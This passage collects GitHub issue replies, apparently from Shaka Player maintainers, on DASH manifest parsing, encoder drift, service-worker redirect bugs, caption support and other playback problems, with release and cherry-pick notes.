security testing, to prevent a bug in our DASH parser from leading to a server-side exploit.. The DASH parser is already exposed from the compiled library: shaka.dash.DashParser.  So you can use that from that context already.\nBut if we extract it into a separate node module, even if you don't intend to use it server-side, the fact remains that it would be trivially usable server-side.  If we publish something that doesn't depend on a browser, we would have a responsibility to make sure it was not a security risk when used server-side in nodejs.. This is not possible today.\nThe DashParser was not intended as a general parser, but as an internal component of Shaka Player.  It implements the ManifestParser plugin interface, which is responsible for more than just parsing.  Such a plugin must fetch the initial manifest, update that manifest if required, and interpret the manifest to produce our internal manifest structure.\nI don't know what your goal is, so it's hard to make a single recommendation.\nIf you want something like https://github.com/videojs/m3u8-parser, I think Shaka's DashParser may be a poor fit, even if we stripped away the networking parts.\nThe output of DashParser does not look like the input manifest.  You won't find individual attributes or elements from the XML.  Instead, you'll find a highly processed structure with a subset of the original information in a completely different form.  You won't find availabilityStartTime, timeShiftBufferDepth, etc.  Instead, you'll find a PresentationTimeline object which is meant to inform decisions in StreamingEngine, Playhead, and other classes.\nIf you want to parse the manifest and get access to the original data, you can simply use the browser's own DOMParser class to parse the XML.  Then you'll have everything in its original form.\nWhat is your goal, exactly?  Maybe I can make a better recommendation if I understand your purpose.. It seems to me that having a parser is not an end-goal.  What will you do with your parsed manifest?  Are you building a content linter or analysis tool?  Are you creating a more purpose-built player?  Are you transforming the manifest into some other format to avoid repackaging content?\nI expect that I can give you better advice if I have some idea of what your end-goal is.. Also, we support syncing with the Date header of an arbitrary URL via configuration, so you don't really need to use UTCTiming in the manifest if that particular method works.  (That is also one of several UTCTiming schemes currently specified.)  Any uncacheable endpoint you control would work, so long as the server returns a Date header corresponding to \"now\".. I agree with @TheModMaker.  For this, I think you should store the init data in the database instead of refetching the manifest.  See externs/shaka/offline.js for shakaExtern.ManifestDB.\nAlso, as @TheModMaker points out, your work may need to be adjusted once #1248 is complete, as we are refactoring the internals of Storage quite a bit.. @vaage: JFYI, as this may intersect with your work on #1248.. We will look into supporting new init data from manifest updates.  Sorry for the trouble!. Thanks, @TheJohnBowers.  We'll take another look.. The work we've done so far was cherry-picked to v2.4.5.  I said v2.5.0 before, but I wasn't reading my own notes when I was cherry-picking things.  Whoops.  Enjoy!. I believe this will be obsolete after #1339, but we will see.. We currently support all the same manifest types on all browsers because we interpret the manifest ourselves.  What we feed to the browser is then independent of the manifest type.\nIn the future, we will be able to take advantage of Safari's native HLS implementation.  We will do this primarily for iOS, but it will also be possible on desktop Safari.  We do not know yet if there will be a reason to prefer native HLS on desktops.  On iOS, it will be the only choice.\nThe method shaka.Player.probeSupport() will tell you what is supported, in detail.  This includes manifest formats.  When we start using the native HLS support on iOS, that probe on iOS would show HLS support, but not DASH.\nYou should also be able to use player.load() speculatively.  You could, for example, load a DASH manifest first.  If it fails with UNABLE_TO_GUESS_MANIFEST_TYPE, you could then try HLS.\nThat is the current error code that you would see if DASH support were omitted from the build.  I think we should introduce a new error to give clearer guidance in cases such as this future scenario, where we must rely on native support instead of our own manifest parsers.. HLS on desktop Safari is already out.  TS support requires mux.js, which our demo app uses.\nThe current release is affected by #1214, which prevents the selection of TS anywhere, and is fixed in the nightly build.  The fix will soon be cherry-picked to v2.3.4.\nPlease try out HLS/TS on Safari in our nightly build:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=//bitdash-a.akamaihd.net/content/MI201109210084_1/m3u8s/f08e80da-bf1d-4e3d-8899-f0f6155f6efa.m3u8;play. If you find that the estimated bandwidth is lower than what your network can technically support, this is actually normal and expected.\nThere are many reasons why a 10Mbit connection does not achieve a full 10Mbit in practice, and they are difficult to predict or model in advance.  Our estimate is based on our actual throughput, which means our estimate accounts for these things naturally: WiFi connection quality/stability, throughput to the actual server hosting the segments, and even latency introduced by our own one-at-a-time way of streaming segments.  (Shaka Player would be more efficient at consuming available bandwidth if we overlapped the beginning of a request with the end of the previous request.  For complexity reasons, we don't do this.)\nIt's always possible that we're doing something wrong, or that our estimate could be better.  Let us know how those config changes work for you.. Ah, I see!  Then the configurations are definitely for you.  We have conservative default settings, and we try not to use more than a certain percentage of what we think your bandwidth is.  You can raise that percentage.. Fix cherry-picked to v2.4.5.. We assumed that an HTTP redirect would be for load-balancing purposes, and should probably go back to the load-balancer for a manifest update.  Segments URLs, though, are relative to the redirected URL (when available from the platform).\nWere we wrong about that?  Should redirects for manifests be \"sticky\"?. Okay, that's reasonable.  I will rename the issue and classify as an enhancement for v2.5.  Thanks!. Done.  Thanks for catching that!. > Are you using the demo app or your own custom app?:\n\nCustom App: Shaka as a Tech backend to VideoJS\nIf custom app, can you reproduce the issue using our demo app?:\nI have not tired yet. I think I would need to run the demo app locally as our manifest are behind private infrastructure. If there is a way to do this, let me know.\n\nJust check out our source code and compile it.  See https://shaka-player-demo.appspot.com/docs/api/tutorial-welcome.html\nYour local web server needs to be able to access the source code.  Then just load index.html.\nWe can't debug integrations into third-party apps like videojs, but if you can reproduce with our demo app, it becomes much easier for us to work on.\n\nWhat are the manifest and license server URIs?:\nI know you said you need a URI, but they are protected behind private infrastructure.\n\nWe need this to be able to reproduce any content-specific issue.  The manifest contents are rarely enough for us to work with.\nIf you can't provide the URI publicly, you can share it privately by emailing to shaka-player-issues@google.com and referencing this issue number.  The information will only be accessible by the Shaka Player Team at Google.\nIf you can't do this, you may want to try reproducing the issue with some public piece of content.  We have dozens of pieces of publicly accessible content in the demo app.  If one of them can be used to trigger the issue, we should be able to reproduce it easily.. I'm marking this as \"external\" because it seems to be a Firefox-specific decoding error.  @stanislavche, you didn't mention what OS you are using with Firefox 59 and nightly.  Can you tell us what OS you are using?\n@cpeterso, can you weigh in on this?  The content fails to play on FF 59 and up, with Error Code: NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005) Details: void __cdecl mozilla::EMEDecryptor::AttemptDecode(class mozilla::MediaRawData ): Failed to convert encrypted AAC sample to ADTS.  We have been provided with a DASH manifest privately, but we do not yet have access to request a license.  Can you tell us anything based on the error code?  Or tag someone else at Mozilla who can?. Thanks, Chris!  @stanislavche, does this help?  Is there anything else we can do?\n(We will keep this bug open until we see the corresponding Mozilla bug closed.). The corresponding Firefox bug has been closed, with this note:\n\nThe bug was reproduced on Firefox 59.0.2 using the steps from comment 0.  We verified the issue on Windows 10 x64, Windows 8.1 x64, Ubuntu 16.04 x86 and macOS 10.13 using Firefox 60 Beta 8.\n\nPlease retest with a nightly or beta build of Firefox.\nSince the upstream bug has been closed, we will close this one as well.  Thanks!. @stuartflanagan, did @BucherTomas's comments help?. We will not be able to reproduce your issue without a manifest URI.  Can you please provide one?\nError code 4001 is DASH_INVALID_XML, so I doubt that the ampersand in the URL is the source of the problem.. Here's a counterexample with an ampersand in the URL:\nhttps://shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/_bugs/1380-%26-counterexample/angel-one/dash.mpd;lang=en-US;play;build=uncompiled\nThis plays, so I suspect you might have some encoding problem in your XML.  Could it be that some part of the URL appears in your manifest, and that it's not properly escaped inside the XML?  For example:\nxml\n<BaseURL>Wrong&encoding.mp4</BaseURL>\n<BaseURL>Right&amp;encoding.mp4</BaseURL>\nI'm only guessing, but if that's not it, then please send a manifest URL so we can reproduce your issue and help you debug.  Thanks!. @mephillips423, you have not provided a manifest URI, and we are unable to reproduce your issue with our own content.  I'm going to go ahead and close this as \"unable to reproduce\".\nIf you still need help with this, you can request the issue be reopened by replying with \"@shaka-bot reopen\".  This will trigger our build bot to put the issue back into queue for us to look at.\nThanks!. Yes, it could be the title.  Any raw ampersand in the contents of any tag is invalid XML.\nThanks for the update!. Are you using the Widevine or PlayReady setting in the intertrust test app?. We consulted the Chromecast team internally, and this appears to be a minor bug in the device firmware on gen1 Chromecasts.  As a workaround, they recommend setting the robustness to \"HW_SECURE_ALL\", \"HW_SECURE_DECODE\" or  \"HW_SECURE_CRYPTO\".  This will trigger a different CDM implementation that reports HDCP correctly.\nI am not familiar with the intertrust test app, but I notice there is no robustness setting in the application UI.  If they are hardcoding one of the above robustness values in their application, that could explain the difference.. The fix for error 4017 has been cherry-picked for v2.3.6.. @aryan007, can you double-check that your TS content is valid?  We are unable to read it after fixing the bug in our HLS parser.. I haven't reproduced the error yet, but from the symptoms, it sounds like encoder drift.\nThis happens when the encoder falls behind the ideal timeline.  For example, if after 20 hours, only 19.98 hours of content were produced, then the encoder would have fallen behind by 1.2 minutes.  This might be small, or it might be large, depending on some other details.  If your timeShiftBufferDepth were only 1 minute, then you'd be unable to play anything at all, because all content would be outside the availability window.\nHLS doesn't have this problem because it doesn't have an ideal timeline at all.  You are supposed to begin playback 3 segments from the end, regardless of when the stream started.  In fact, the player may not know when the stream started at all.\nIn the future, we will refactor our DASH support to derive the availability window from the list of segments (#999).  Then, the player will implicitly tolerate DASH encoder drift by behaving more like HLS.\nWe have this problem in our own content.  The \"Shaka Player History\" stream eventually falls behind in the DASH version, but is generally working well in the HLS version.. I've been playing for 30 minutes now without any issue.  Are you seeing this issue on our demo app?  Or in your own app?. Actually, if I reload the stream, I do sometimes see those \"cannot find segment\" logs, but the stream does seem to recover within a few seconds:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://edge1.motv.eu///channels/eurosport-1-hd-42/live/eurosport-1-hd-42.mpd;play. As far as I know, encoder drift does not apply to HLS because there are no calculations involving the current time when you start an HLS stream.\nI'll see if I can understand the source of that startup delay.. @jakubvojacek, when times are aligned after the packager is started, but not after many hours of playback, this is encoder drift.  The live streams that I publish are currently keeping up with real time (ffmpeg reports 1x on the command line), but sometimes they fall behind, with ffmpeg reporting more like 0.999x.\nThat 0.1% difference can, over 20 hours, accumulate to more than 1 minute of drift.  So even what looks like a tiny amount of drift can add up quickly.  When you are using free, off-the-shelf tools to encode content, you can't guarantee perfection.  (I doubt you can guarantee perfection with any software-only solution.)\nBecause of this, and because of our recent first-hand experience publishing live streams, we have changed our position on encoder drift.  We used to label drifting streams as \"bad content\", but we now feel that drift is inevitable (at least in DASH), and that there's no reason we should continue to reject or fail such content.  (We can't even produce 100% non-drifting content ourselves, so who are we to judge the whole industry?)\nIn HLS, the lack of a strict timeline means that there's nothing to drift away from in the first place, making HLS more robust for strict players.  So the future of our DASH implementation will behave more like HLS, to avoid rejecting things we could otherwise play.\nI recommend that you subscribe to #999 to keep tabs on our progress in tolerating drift.  This is scheduled for the v2.5 release, and is part of a much larger refactoring effort in that release.\nThanks!. Happy April Fool's, everyone!. Happy April Fool's, everyone!. Thanks!  Cherry-picked for v2.3.6.. Thank you, but I meant in the entire project, not just the docs.  Don't worry, though, I'll take care of it.  git grep -l was a very helpful hint.  Thanks!. Scheduled for v2.5.  Thanks!. Rough plan: Use this API (if present) to drive an additional filtering pass on the media.  If any variants are smooth, we avoid all non-smooth variants.\nWe may want to consider using the powerEfficient field as well if the data-saver flag is on.  See #855.. To clarify, I was thinking data-saver being enabled would be a proxy to tell us it's a mobile device.\nBut now I realize that there's a battery API as well.  MDN says it's obsolete, but it's not clear why, and they don't recommend an alternative.\nMounir, I see your name on the battery status spec.  Can you clarify its status?  Is there another way we should determine that powerEfficient is an important bit?. I tried out MediaCapabilities in Shaka Player this week, but I think my plan to use it for an additional filtering pass needs to change.\nFor one, MC is async, and our existing filtering is synchronous.  This means we may want to refactor a bit before introducing it.\nFor another, this is different from our filtering based on isTypeSupported, codec compatibility (to avoid unsupported codec switches in MSE), and DRM restrictions (to remove things we can't decrypt).  Those things are \"hard\" restrictions that we should never be flexible with.  If a codec is not supported at all, we fail if we try.  But just because something is smooth doesn't mean we should never play it.  smooth is a \"soft\" signal, indicating what we should do.\nWe could still use it as a filter, in some circumstances.  For example, if playback were smooth for 480p & 720p, but not 1080p, we could easily exclude 1080p without much harm.\nBut what if stereo audio were smooth and 5.1 surround were not?  We don't know if that would ever happen in practice, but from the API itself, this is a possible outcome.  Now what if the 5.1 surround track were the original English language version of a TV show, but the French dub were only available in stereo?  I've seen this sort of thing on some region 2 DVDs.  In those cases, we might be filtering out an entire language based on smoothness.\nSo the only safe way to use this as a filter is to first split up the tracks by things like language (and probably other metadata), then filter in each group.  If nothing in a group is smooth, you can't get rid of the whole group.  This sounds like a giant pain.\nThe alternative is to use MC to give ABR hints, rather than filter tracks.  For example, we could annotate the variants with smoothness, and we could disallow AbrManager from choosing anything that is not smooth.  (If MC is missing, we would assume everything to be smooth.)\nI'm leaning toward using MC for ABR hints, as this is a much smaller refactor.. @avelad, I'm unable to reproduce with Shaka Player v2.3.5 and Chrome 65.0.3325.181 on Linux.  I see segments requested from cdn.demo, not balancer.demo.\nCan you please check again, and make sure your copy of Chrome is fully updated?. Interesting, let me try again.. It seems that the issue only appears when a service worker is used.  This is unexpected, but it explains why v2.3 fails and v2.2 works: we didn't have a service worker in v2.2.. I suspect this will turn into a bug filed against Chrome, but I need to investigate more deeply.  Labelled \"bug\" for now, and assigned to the v2.5 milestone.. I used the following code in the JS console to test this:\n```js\nxhrRedirect = async (url) => {\n  const x = new XMLHttpRequest();\n  await new Promise((done) => {\n    x.onload = done;\n    x.open('GET', url, true);\n    x.send();\n  });\n  return x.responseURL;\n};\nfetchRedirect = async (url) => {\n  const r = await fetch(url);\n  return r.url;\n};\nurl = 'https://balancer.demo.anevia.com/live/eds/Arte/dash/Arte.mpd';\n```\nTo test with our service worker, I ran this in the context of the Shaka Player demo.  To test without a service worker, I ran this in the context of about:blank.  To test with service workers generally, I ran this in the context of a separate service worker demo.  For the SW test, I made sure that the \"Bypass for network\" checkbox in the \"Application\" tab of the Chrome debugger was unchecked.  Reload after changing this setting to make sure it is in effect.\nHere are my results in Chrome 68:\n|   | await xhrRedirect(url) | await fetchRedirect(url) |\n| --- | --- | --- |\n| Shaka demo | \"https://balancer.demo...\" | \"https://cdn.demo...\" |\n| about:blank | \"https://cdn.demo...\" | \"https://cdn.demo...\" |\n| SW demo | \"https://cdn.demo...\" | \"https://cdn.demo...\" |\nSo it seems that we are at fault, although I don't yet understand why.  Here's the working SW code for comparison: https://googlechrome.github.io/samples/service-worker/basic/service-worker.js. I found the trigger in our service worker.  Although this effect is triggered by our service worker, it seems that the bad behavior is still in the browser, and it only affects XHR.  When fetch is used, everything seems to work correctly.\nThe difference between our SW and the SW demo I tried is that ours uses event.respondWith on all requests.  We then asynchronously open the cache and decide if we have a cached copy, and if not, we decide whether or not we should cache one now.  If we should not cache a copy, we just call fetch and pass the results directly through.\nThe big difference is that the SW demo only calls event.respondWith on specific URLs, and it makes that decision synchronously.\nDuring installation, our SW will store a bunch of demo app assets by relative URLs.  Later, at fetch time, we are presented with an absolute URL to make a decision with.  We can't compare that to the relative URL, so instead we check the cache.  Checking the cache is async, so we have to take responsibility for the request (event.respondWith()) early.\nWhen we take responsibility for all requests, we trigger what I suspect is a Chrome bug: the redirect URL from the fetch() call in the service worker is not propagated through to the XHR in the application.\nWe could/should stop managing all requests, but this will be tricky.  If we stop using relative URLs, the SW in our demo app will not work in arbitrary locations.  So we would need (I think) to map them to absolute URLs during installation/activation, then be able to look them up synchronously at fetch-time.\nI also think it's worth tracking down the bug in Chrome if possible.\nFor now, as a workaround, you can simply upgrade to v2.4.4.  Starting with v2.4.0, fetch is preferred over XHR.. Because this is working correctly with Fetch in v2.4, I'm going to move this issue to the backlog.  I'd like to fix it, but it's not critical now.. I believe we have a change coming soon to add the new functionality to Fetch, as well.. This is the classic symptom of a stream which is experiencing \"drift\".  This is when the actual output of the packager/encoder drifts away from the ideal timeline presented in the manifest.\nFor example, if your output speed is 0.999x real time, after only 24 hours, your stream will have drifted by more than 1 minute.  This is enough to cause issues at the live edge.\nWhen a stream is drifting, the problem goes away when the encoder/packager is restarted.  This is because restarting everything brings the stream back into alignment with reality.  Over time, the drift accumulates again.\nTo deal with this, we are planning a refactor in v2.5 (#999) so that we will ignore the idealized timeline presented by the DASH manifest, and derive a realistic timeline from the list of segments.\nI can't say for certain if you are seeing drift, because you did not send us a manifest URI.  We would need this information to reproduce the issue and diagnose it in detail.  But your symptoms seem to match drift.\nFor now, I will close this as a duplicate of #999.  If you feel this is a mistake, or if you would like to send us a manifest that we can use to reproduce, please ask for the issue to be reopened by replying with \"@shaka-bot reopen\".\nThanks!. @samaduttan, please provide manifest URIs, not the contents of the manifest.  We cannot attempt to play your content with the manifest text alone.  Thanks!. If you can't give us access to the stream remotely, then it will be very difficult for us to reproduce your issue.  Since it appears to be a live stream, there's no good way to give us a static dump of the content, either.\nIf you can share the manifest URI privately, you can send it to shaka-player-issues@google.com and it will not leave the team.\nUltimately, if we can't reproduce the issue, we can't help you diagnose the cause.. You sent us a manifest privately, but all of the segment requests result in 404 errors.  We need access to both the manifest and the segments in order to reproduce your issue.  Thanks!. @samaduttan sent me some relevant info personally, which I didn't realize.  I have forwarded it to the shaka-player-issues alias so the team can take a look.. We believe this is an issue with your content.  If you believe that the content should be playable on hardware decoders as-is, you can file a bug on chrome at crbug.com.\nPlease let us know if you need any assistance from us on this.. We can't reproduce your issue with a snapshot of a live manifest.  To reproduce, we would need a playable manifest URI.  (We would also need an XBox One, which we do not currently have.)  If there is any way you can share a live URI with us, even privately, please do.  We can accept private URIs at shaka-player-issues@google.com .  Please reference the issue number if you email us there.\nLet's see what we can do for you abstractly, though.\nIf Edge is throwing QuotaExceeded errors, it means its MediaSource implementation can't handle the amount of data it has buffered.  Embedded devices such as the XBox One typically have smaller quotas than desktop computers, so this is not unusual on its own.  Since we are trying to buffer too much data, we try to reduce the buffering goals to compensate.\nWe have seen situations in the past where a single segment is larger than the quota for a device, so no reduction in the buffering goal can possibly allow us to recover.  My suggestion in such cases is that we should try to avoid the particular representation that caused this error, since it is too large or too high-bitrate for the device to handle.  That wouldn't work for you, though, because you only appear to have one video stream and one audio stream.  Besides all this, 4MB would be a very small segment to break a device's quota.  It's still possible, but I find it unlikely.\nA browser is supposed to try to make room in its buffers by evicting older data before throwing QuotaExceeded.  If this is broken in the browser, that might explain the behavior you're seeing.  One thing you can try to test this theory is to reduce the streaming.bufferBehind configuration.  By default, we keep 30 seconds in buffer behind the playhead.  By reducing that value, you are less likely to be in a situation where the browser should have to evict any of that old data.  Since your manifest appears to have 1-second segments, try setting bufferBehind to 2 or 5.  If that works, we know it's a browser bug, and we have a workaround.\nIf that doesn't work, let us know, and we will look for other possibilities.. I'm not sure what else we should try.  Is there a JS debugger on that platform that you can use somehow to get logs?\nI will see if any of my colleagues have an XBox One in the office for testing on other projects.  We might be able to borrow it for a while to try to reproduce this.\nI have confirmed that we can generally play the content at the manifest URI you provided.. Update: I'm buying us an XBox, which should be available in our lab next week.. As far as we can tell, this is an external issue, on Microsoft Edge.  It appears that data is not being removed from buffer when we use the SourceBuffer.remove method.\nThis is fairly fundamental to MediaSource playback, and we are not aware of any workaround.  This issue needs be to raised with Microsoft.  Please feel free to CC me if you need help in that conversation.. > If this issue is caused by the combination of MediaSource and DOMParser, then having a js-polyfill will not be an effective workaround.\nThat's not true.  Because the issue was triggered by the combination of the two, a js-polyfill that replaces native DOMParser is an effective workaround.  The polyfill I posted above does just that.  If the native DOMParser is not used, the bug is not triggered.\n\nIs there anyway to mitigate the MediaSource bug?\n\nMicrosoft stated that a firmware update was on the way which would fix the bug.  Since that time, version 10.0.17134.4056 was released on July 5.  Since the firmware update is out, I will close this issue.  If the issue can still be reproduced with that firmware, please let us know, and we will reopen the issue.\nThanks!. Good question!  We don't have a way to configure Shaka to avoid all text handling.  What we have instead is a plugin to allow applications to handle text rendering.\nIt's called TextDisplayer, and you can configure Shaka to plug in your own implementation of this interface.  See the configuration dictionary definition, specifically the textDisplayFactory field.\nDoes this help?. Our default TextDisplayer plugin (shaka.text.SimpleTextDisplayer) is responsible for creating the TextTrack object on the video element.  If you replace that with your own implementation, there will be no manipulation of the video element for text.  If you choose not to display anything in your implementation, then Shaka Player would still fetch and parse text, but the cues would be discarded by your implementation.\nWould that meet your needs?  Or do you need us to avoid fetching text as well?. Thank you for the kind words.  We're glad to be doing this.  And thanks for the contribution as well!\nI forgot one thing, though.  You will need to add yourself to the CONTRIBUTORS file (in alphabetical order), and you'll need to add an entry to the AUTHORS file, as well.  If you signed the CLA as an individual, you add yourself to AUTHORS.  If you are covered by a corporate CLA, you add your company to AUTHORS.\nThanks!. Thank you for your contribution!. Cherry-picked to v2.3.6.. Confirmed.  I will see what I can figure out about this.  First I will try to determine if it is content-specific.. I am unable to reproduce with this stream, which is interesting:\nhttps://v2-3-5-dot-shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-live-assets/player-source.mpd;lang=pl;build=uncompiled\nNot sure what that means yet.  That stream has a much longer seek range (15 minutes vs 30 seconds), but that may be irrelevant.  In both cases, the playhead gets bumped back into the seek range as it falls out during buffering, as it is meant to.\nIt may be time to bisect the source between v2.3.2 and v2.3.5 to find the specific commit that caused this change in behavior.  Since my other analysis hasn't turned up anything useful, a bisect may be the best way to understand what is going wrong.. Thank you!  We'll try to narrow it down further.. Fix cherry-picked to v2.3.7. As you observed, selectTextTrack has no return value.  The documentation agrees with that: https://v2-3-5-dot-shaka-player-demo.appspot.com/docs/api/shaka.Player.html#selectTextTrack\nHave you tried enabling the text track with setTextTrackVisibility?  https://v2-3-5-dot-shaka-player-demo.appspot.com/docs/api/shaka.Player.html#setTextTrackVisibility. @eladonline, JFYI, everyone on the team is on US/Pacific time, so you should not expect replies outside of normal office hours in our time zone.  When your own time zone is offset from ours by more than 6-8 hours, this introduces a lot of latency into communication.  That's just the nature of having a global conversation.  :-)\nI think the problem is that it's not track.setTextTrackVisibility(true) as you wrote, but player.setTextTrackVisibility(true).  Please compare your code to the docs I linked above, and also check the JavaScript console.  If you call that method on Track instead of Player, you should see an exception in the console telling you that there is no such method.\nDoes that help?. No worries.\nIf it works in JWPlayer and not in your custom app, the next question is whether or not it works in our demo app.  Can you please try in our demo?  You can select \"custom asset\" from the assets list and enter a URL.  You will need to either allow cross-origin access to your asset or disable CORS restrictions in your browser.\nI would also like you to confirm what version of Shaka Player you are using.  Your report says \"5.6.0\", but that version doesn't exist.  Our latest release is v2.3.6.  What version are you using?. I found your email, but it does not contain a manifest URI.  It appears to be just your email signature and no content.  Can you please send another email with the manifest URI?\nAs for HTTP_ERROR, that still appears to be CORS at work.  Due to a suspected Chrome bug, to disable CORS, you must use both --disable-web-security and open the debugger, go to the Application tab, click the \"Service worker\" section, and check the \"Bypass for network\" box.  Please do that and report your results.\nThanks!. @eladonline, I'm sorry, we haven't looked at this yet.  Thank you for your patience.. @eladonline, if you can provide us with samples and the tools that created them, we may be able to support these non-standard VTT files.  I would need to understand how they are created before we change the parser to accommodate.  Please file a new issue if you want to pursue this.  Thanks!. We currently only support CEA608/708 in TS segments, so we would need to investigate how to extract them from MP4 segments.  Also, our current CEA608/708 support is based on the parser provided by mux.js.  We would need to investigate whether or not it makes sense for mux.js to do this for MP4, as well.. Blocked on https://github.com/videojs/mux.js/issues/190. @chrisfillmore, I'm not sure of the answer, but in Shaka Player, we give applications control over track selection.. @dsparacio, thanks for the link!  We'll keep it mind if we decide to explore alternatives to mux.js.. Hi all,\nWhen we update mux.js, there will probably still be integration work to complete on our side.  As a new feature, this would not appear until v2.5 at the earliest.. Hi everyone,\nWe are hard at work on this, and it is a priority for us for v2.5.  As soon as we have something to show for it, we will release another v2.5 beta.  The final v2.5.0 will wait on both this and src= support (which enables both progressive mp4 playback and FairPlay support on macOS and iOS).. Which issue?. The work we've done so far has been released in v2.5.0-beta2.  There are still integration tests to write, plus we need to align our HLS CEA implementation with the DASH CEA implementation, and we need to deprecate one-off APIs for HLS CEA in favor of the tracks API we are using for DASH CEA.. @jakubvojacek, the muxjs reference appears to be fixed now.. When VTT is segmented, but not packaged in MP4, the only standard I can find for how to interpret those timestamps is in the context of HLS and an extension that maps VTT cues to units in the MPEG2TS timescale.\nEssentially, there is no standard for the interpretation of segmented VTT in text form.. This is only one buffering.  Here's what these logs mean:\n\nstreaming_engine.js:752 (all): seeked: unbuffered seek: clearing all buffers\nThis means the StreamingEngine detected a seek and set a flag to clear all buffers.\n\nAudio and video are buffered separately in MediaSource, and so each individual buffer needs to be cleared.  This action is deferred until the MediaSource buffers are idle because MediaSource doesn't allow you to manipulate buffers that are currently being updated.\n\nstreaming_engine.js:1074 (audio:2) skipping update and clearing the buffer\nstreaming_engine.js:2131 (audio:2) clearing buffer\nstreaming_engine.js:2139 (audio:2) cleared buffer\n\nNow the audio update is complete, and we can finally remove the buffered audio data.  Then we can finally start filling the audio buffer with data from the new seek position.\n\nstreaming_engine.js:1074 (video:1) skipping update and clearing the buffer\nstreaming_engine.js:2131 (video:1) clearing buffer\nstreaming_engine.js:2139 (video:1) cleared buffer\n\nThis is the same as just above, but specifically for the video buffer.\nDoes this clear things up for you?. Marked as \"bad content\" due to the invalid XML.  @hdodev, please let us know if you need any further assistance.. Thanks!. Cherry-picked to v2.3.7. @Thiagobhmg, for offline playback of MP3, or MP3 playback in general, you don't really need Shaka Player.  You can cache MP3s using the Cache API and play them back using the HTML5 audio element.  Your application itself needs to be available offline as well, using a Service Worker to turn the application into a PWA.. @theodab, how much wider does the seek range need to be to avoid this?  Take a look at 7edb11ba39285bc9f92edbc1b88dbcb163b43c71 and see if MIN_SEEK_RANGE needs to be increased.. Can you please test one more time on the V1 Chromecast?  I want to be sure we are picking values that work on the slowest hardware we have.\nWhatever works for the V1 Chromecast, let's choose that for MIN_SEEK_RANGE and leave comments explaining how we arrived at that value experimentally.. The changes that have been made so far are in v2.3.7 and will also be in our upcoming v2.4.0 release.  I'm going to bump this to v2.5 for any additional investigation that is needed.. Cherry-picked for v2.4.2.. Cherry-picked for v2.3.10.. @BucherTomas, I have reproduced and confirmed the bug, and scheduled it for v2.4.  We will attend to it as soon as we can.\nTechnical details for whoever picks this bug up:\nBefore enabling subtitles:\n  - video.textTracks[0].mode evaluates to \"hidden\"\n  - shakaDemo.localPlayer_.isTextTrackVisible() evaluates to false\n  - shakaDemo.localPlayer_.streamingEngine_.mediaStates_.text is non-null (which is a surprise)\n  - subtitles are not shown\nAfter enabling subtitles:\n  - video.textTracks[0].mode evaluates to \"showing\"\n  - shakaDemo.localPlayer_.isTextTrackVisible() evaluates to true\n  - shakaDemo.localPlayer_.streamingEngine_.mediaStates_.text is non-null\n  - subtitles are not shown, but should be shown\nAfter disabling subtitles again:\n  - video.textTracks[0].mode evaluates to \"hidden\"\n  - shakaDemo.localPlayer_.isTextTrackVisible() evaluates to false\n  - shakaDemo.localPlayer_.streamingEngine_.mediaStates_.text is null (as it should be)\n  - subtitles are not shown\nAfter enabling subtitles a second time:\n  - video.textTracks[0].mode evaluates to \"showing\"\n  - shakaDemo.localPlayer_.isTextTrackVisible() evaluates to true\n  - shakaDemo.localPlayer_.streamingEngine_.mediaStates_.text is non-null (as it should be)\n  - subtitles are shown (as they should be)\n. Cherry-picked for v2.3.8.. Thanks, @BucherTomas, we'll take a look.. Fixes cherry-picked for v2.3.8.. I'm fairly sure playback does start without waiting for a license exchange.  What makes you say that it doesn't start until the license is fetched?  Can you provide steps to reproduce your results?. Well, we always start playback without waiting for DRM.  Here's a demo that shows this in action:\nhttps://shaka-player-demo.appspot.com/demo/#asset=https://storage.googleapis.com/shaka-demo-assets/angel-one-widevine/dash.mpd?;license=https://240.0.0.0/this_will_never_respond;play\nIt's the same Widevine-encrypted Angel One clip, but with the license server set to an address that will not respond.  You will see playback stop after the 10-second clear lead runs out.\nI think what you have been seeing is that our license server responds fast relative to the time it takes to fetch segments.\nDoes this help?. There may be a way to keep our wrappers (drm_it wrapping it) without breaking the detection of async functions by it.  I'm not sure though.\nI'll try to look into it this week.. Assigned to @TheModMaker.  Make it so!. Shaka Player already supports adapting video streams.  Without that, we wouldn't be an ABR player!\nTo switch video streams manually, disable ABR with player.configure() and use player.selectVariantTrack() to select a specific track.\nI'm not sure, but it sounds like you're actually looking for support for multiple camera angles.  Is that right?. Cherry-picked for v2.3.8.. To reproduce at the office, I had to use Chrome's \"Slow 3G\" emulation in the network panel of the debugger.\nHere's a stack trace:\nError: Shaka Error PLAYER.OPERATION_ABORTED ()\n    at new shaka.util.Error (http://localhost/shaka/lib/util/error.js:89:13)\n    at abort (http://localhost/shaka/lib/util/abortable_operation.js:168:25)\n    at shaka.util.AbortableOperation [as onAbort_] (http://localhost/shaka/lib/util/abortable_operation.js:216:15)\n    at shaka.util.AbortableOperation.abort (http://localhost/shaka/lib/util/abortable_operation.js:120:17)\n    at operations_.forEach (http://localhost/shaka/lib/util/operation_manager.js:56:23)\n    at Array.forEach (<anonymous>)\n    at shaka.util.OperationManager.destroy (http://localhost/shaka/lib/util/operation_manager.js:50:22)\n    at shaka.dash.DashParser.stop (http://localhost/shaka/lib/dash/dash_parser.js:363:33)\n    at shaka.Player.cancelLoad_ (http://localhost/shaka/lib/player.js:208:31)\n    at shaka.Player.unload (http://localhost/shaka/lib/player.js:1341:14). shaka.util.OperationManager.destroy should never return a rejected Promise.. The \"Fast 3G\" setting also works for repro.  Also, instead of clicking \"Load\" twice, you can click \"Load\", then \"Unload\".. I misread the stack trace.  OperationManager.destroy does not return a rejected Promise.  The error object was created inside that method, but the rejected Promise happened at player.load(), which is correct.  The problem is that we're dispatching OPERATION_ABORTED from load() instead of LOAD_INTERRUPTED.  The demo app ignores LOAD_INTERRUPTED, as it should.. The bug does not affect v2.3.x.. Although they are both async methods, unload() followed by destroy() without waiting should not cause errors.  I'm putting this back in queue to be reproduced by this week's bug cop.. Let's leave it in the backlog for now, since we don't have any partners who require this at the moment.  If someone needs something like this, we can consider it in a subsequent round of release planning.. @sridhard, this is marked as an enhancement, and targeted for v2.5.  When a change has been made related to this issue, github will show a link to the change and close the issue.. Enhancement cherry-picked to v2.4.5.  I said v2.5.0 before, but I wasn't reading my own notes when I was 